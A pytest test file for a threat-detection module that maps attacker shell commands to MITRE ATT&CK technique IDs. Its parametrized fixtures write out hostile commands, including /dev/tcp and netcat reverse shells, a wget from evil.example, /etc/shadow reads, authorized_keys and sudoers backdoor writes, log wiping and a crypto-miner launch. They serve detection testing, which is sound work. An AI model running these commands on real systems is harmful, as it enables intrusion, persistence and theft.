"""Tests for :mod:`anglerfish.threat.techniques`."""

from __future__ import annotations

import re

import pytest

from anglerfish.threat.techniques import TECHNIQUES, TechniqueRule


def test_rule_post_init_validates_id() -> None:
    with pytest.raises(ValueError):
        TechniqueRule(id="", name="x", description="d")


def test_rule_post_init_validates_weight() -> None:
    with pytest.raises(ValueError):
        TechniqueRule(id="T0", name="x", description="d", weight=0)
    with pytest.raises(ValueError):
        TechniqueRule(id="T0", name="x", description="d", weight=51)


def test_rule_matches_command_name() -> None:
    rule = TechniqueRule(
        id="T0",
        name="x",
        description="d",
        commands=("whoami",),
    )
    assert rule.matches("whoami") is True
    assert rule.matches("/usr/bin/whoami") is True
    assert rule.matches("whoamiX") is False
    assert rule.matches("echo whoami") is False  # not the first token


def test_rule_matches_empty_command() -> None:
    rule = TechniqueRule(id="T0", name="x", description="d", commands=("whoami",))
    assert rule.matches("") is False
    assert rule.matches("   ") is False


def test_rule_matches_command_pattern() -> None:
    rule = TechniqueRule(
        id="T0",
        name="x",
        description="d",
        command_patterns=(re.compile(r"history\s+-c"),),
    )
    assert rule.matches("history -c") is True
    assert rule.matches("history -ca") is True
    assert rule.matches("ls") is False


def test_rule_falls_back_to_whitespace_split_on_shlex_error() -> None:
    rule = TechniqueRule(id="T0", name="x", description="d", commands=("echo",))
    # Unterminated quote — shlex.split raises ValueError, we fall back.
    assert rule.matches('echo "unterminated') is True


def test_persistence_techniques_present_in_default_set() -> None:
    persistence_ids = {r.id for r in TECHNIQUES if r.persistence}
    assert "T1053" in persistence_ids  # cron
    assert "T1098" in persistence_ids  # authorized_keys
    assert "T1136" in persistence_ids  # useradd
    assert "T1543" in persistence_ids  # systemd unit install


def test_default_set_all_unique_ids() -> None:
    ids = [r.id for r in TECHNIQUES]
    assert len(ids) == len(set(ids))


@pytest.mark.parametrize(
    ("command", "expected_id"),
    [
        ("whoami", "T1033"),
        ("uname -a", "T1082"),
        ("ls /etc", "T1083"),
        ("ps -ef", "T1057"),
        ("ip addr show", "T1016"),
        ("netstat -ntlp", "T1049"),
        ("nmap 10.0.0.0/24", "T1046"),
        ("cat /etc/shadow", "T1003"),
        ("wget http://evil.example/x.sh", "T1105"),
        ("crontab -e", "T1053"),
        ("useradd -m attacker", "T1136"),
        ("systemctl enable evil.service", "T1543"),
        ("history -c", "T1070"),
        ("./xmrig --pool stratum+tcp://x:1234", "T1496"),
    ],
)
def test_known_command_triggers_expected_technique(
    command: str,
    expected_id: str,
) -> None:
    matched = {r.id for r in TECHNIQUES if r.matches(command)}
    assert expected_id in matched, f"{command!r} did not match {expected_id}"


def test_authorized_keys_command_matches_t1098() -> None:
    matched = {
        r.id
        for r in TECHNIQUES
        if r.matches('echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys')
    }
    assert "T1098" in matched


def test_indicator_removal_log_truncation() -> None:
    matched = {r.id for r in TECHNIQUES if r.matches("rm -rf /var/log/auth.log")}
    assert "T1070" in matched


# ---------------------------------------------------------------------------
# Command-context false positives (audit review R2)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    ["apt install vim", "apt-get install -y curl", "pip install requests", "make install"],
)
def test_package_manager_install_does_not_trip_t1543(command: str) -> None:
    """A package-manager install must not match T1543 (audit review R2a).

    The head is not a service-management command; only the loose 'install'
    keyword matched the old cross-head argument_patterns.
    """
    hits = {r.id for r in TECHNIQUES if r.matches(command)}
    assert "T1543" not in hits, f"{command!r} wrongly matched T1543: {sorted(hits)}"


def test_git_show_does_not_trip_t1016() -> None:
    """`git show` must not match network-discovery T1016 (audit review R2a)."""
    hits = {r.id for r in TECHNIQUES if r.matches("git show HEAD")}
    assert "T1016" not in hits, sorted(hits)


@pytest.mark.parametrize(
    "command",
    [
        "systemctl enable evil.service",
        "systemctl start evil",
        "service x start",
        "update-rc.d evil defaults",
    ],
)
def test_service_commands_still_match_t1543(command: str) -> None:
    hits = {r.id for r in TECHNIQUES if r.matches(command)}
    assert "T1543" in hits, f"{command!r} should match T1543: {sorted(hits)}"


@pytest.mark.parametrize("command", ["ip addr show", "ifconfig", "route -n", "arp -a"])
def test_network_discovery_commands_still_match_t1016(command: str) -> None:
    hits = {r.id for r in TECHNIQUES if r.matches(command)}
    assert "T1016" in hits, f"{command!r} should match T1016: {sorted(hits)}"


def test_etc_os_release_read_still_matches_t1082() -> None:
    """Cross-command read of os-release stays detected (now via command_patterns)."""
    hits = {r.id for r in TECHNIQUES if r.matches("cat /etc/os-release")}
    assert "T1082" in hits, sorted(hits)


@pytest.mark.parametrize(
    "command",
    ["cat /etc/shadow", "grep root /etc/sudoers", "less /root/.ssh/authorized_keys"],
)
def test_reading_credential_files_does_not_trip_t1098(command: str) -> None:
    """Read-only credential-file access is T1003, not persistence (audit review R2b).

    T1098 (Account Manipulation) sets persistence_attempted; a plain read
    must not flip it.
    """
    hits = {r.id for r in TECHNIQUES if r.matches(command)}
    assert "T1098" not in hits, f"{command!r} wrongly matched T1098: {sorted(hits)}"


@pytest.mark.parametrize(
    "command",
    [
        'echo "ssh-rsa AAAA" >> /root/.ssh/authorized_keys',
        "vim /etc/sudoers",
        "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "visudo",
        # cp/mv/install/dd writes with the credential file as the
        # destination (audit review R2 follow-up).
        "cp /tmp/k /root/.ssh/authorized_keys",
        "mv /tmp/k /root/.ssh/authorized_keys",
        "install -m 600 /tmp/k /root/.ssh/authorized_keys",
        "cp evil /etc/sudoers",
        "dd if=/tmp/k of=/root/.ssh/authorized_keys",
    ],
)
def test_writing_credential_files_still_matches_t1098(command: str) -> None:
    hits = {r.id for r in TECHNIQUES if r.matches(command)}
    assert "T1098" in hits, f"{command!r} should match T1098: {sorted(hits)}"


def test_copying_credential_file_away_does_not_trip_t1098() -> None:
    """`cp <credfile> /elsewhere` reads the file (T1003/exfil), not Account
    Manipulation; only the file as the cp destination is a write
    (audit review R2 follow-up).
    """
    hits = {r.id for r in TECHNIQUES if r.matches("cp /etc/sudoers /tmp/steal")}
    assert "T1098" not in hits, sorted(hits)


# ---------------------------------------------------------------------------
# ReDoS hardening (audit L5)
# ---------------------------------------------------------------------------


def _t1059_004() -> TechniqueRule:
    return next(r for r in TECHNIQUES if r.id == "T1059.004")


def test_t1059_004_command_patterns_are_not_redos() -> None:
    """Neither T1059.004 gap quantifier may backtrack quadratically.

    The patterns ran `\\|.*?` and `-[ic].*?` over attacker command text;
    both re-anchored at every pipe / `bash -i` occurrence. A non-shell
    head (so matches() reaches command_patterns) plus a long run pinned
    the matcher.
    """
    import time

    rule = _t1059_004()
    payloads = [
        "ls " + "|" * 50000 + " x",  # pattern 1: pipes, no keyword
        "echo " + "bash -i " * 6000 + "x",  # pattern 2: many `bash -i`, no target
    ]
    for payload in payloads:
        start = time.perf_counter()
        rule.matches(payload)
        elapsed = time.perf_counter() - start
        # Generous bound: a linear scan of this input is tens to a few
        # hundred ms even on a slow/contended CI runner, while a
        # catastrophic-backtracking regression would take many seconds.
        # 2s cleanly separates the two without flaking on runner speed.
        assert elapsed < 2.0, f"matches took {elapsed * 1000:.0f}ms (likely ReDoS)"


def test_t1098_write_pattern_is_not_redos() -> None:
    """The T1098 write-context pattern stays linear on adversarial input.

    The bounded ``{0,80}`` gap caps per-start-position work, so even a long
    run of redirect characters (one match start per ``>``) cannot pin the
    matcher. Mirrors the T1059.004 ReDoS bar above.
    """
    import time

    rule = next(r for r in TECHNIQUES if r.id == "T1098")
    payloads = [
        ">" * 50000 + " x",  # a match start at every redirect char, no target
        "vim " + "a" * 50000,  # editor head, long no-target tail
    ]
    for payload in payloads:
        start = time.perf_counter()
        rule.matches(payload)
        elapsed = time.perf_counter() - start
        # Generous bound: a linear scan of this input is tens to a few
        # hundred ms even on a slow/contended CI runner, while a
        # catastrophic-backtracking regression would take many seconds.
        # 2s cleanly separates the two without flaking on runner speed.
        assert elapsed < 2.0, f"matches took {elapsed * 1000:.0f}ms (likely ReDoS)"


def test_t1059_004_still_matches_real_reverse_shells() -> None:
    rule = _t1059_004()
    assert rule.matches("cat /etc/passwd | nc 10.0.0.1 4444") is True
    assert rule.matches("env bash -i >& /dev/tcp/10.0.0.1/4444 0>&1") is True
    assert rule.matches("env sh -c 'exec 5<>/dev/tcp/1.2.3.4/443'") is True
    assert rule.matches("ls -la") is False
